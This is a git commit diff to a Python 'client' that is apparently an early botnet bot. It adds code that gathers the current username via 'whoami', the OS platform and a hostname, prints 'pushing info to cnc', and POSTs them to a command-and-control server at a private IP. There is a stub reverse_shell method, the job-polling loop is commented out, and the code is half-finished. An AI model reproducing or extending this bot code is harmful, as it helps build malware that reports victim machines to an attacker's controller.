e0070dfc0b68e7ee9217b509b84f0ce3c4e34db7
utkarsh <utkarsh@windows>
2020-04-04 15:58:41 -0700

    edit to client

--- client/client.py
+++ client/client.py
@@ -3,22 +3,43 @@ import random
 import sockets
 import requests
 import platform
+import os
+
+def curr_user():
+        user = os.popen('whoami').read()
+        user = user.split("\\", 1)[-1]
+        return user
+    
 class Bot(object):
     
 
     def __init__(self):
         self.platform = platform.system()
-        
+        self.uid = "2135"
+        self.username = curr_user()
+        self.hostname = "end again"
 
     def reverse_shell(self):
         print("end")
 
     def ping_server(self):
-        r = requests.post(server + '/api/' + self.uid + 'status',
-                {'platform': self.platform, 'hostname':self.hostname, 'username':self.username })
+        print("pushing info to cnc")
+        print("username : " + self.username)
+        print("hostname : " + self.hostname)
+        print("OS : " + self.platform)
+        send = {
+                    'platform': str(self.platform),
+                    'hostname': self.hostname,
+                    'username': self.username
+                }
+        print(send['platform'])
+        r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/status', json=send)
         return r.text
 
-    def run():
+    def run(self):
+        print(self.ping_server())
+        
+        """
         while True:
             try:
                 job = self.ping_server()
@@ -37,6 +58,7 @@ class Bot(object):
                             print("end")
             except:
                 print("get fuct")
+            """
 def main():
     bot = Bot()
     bot.run()
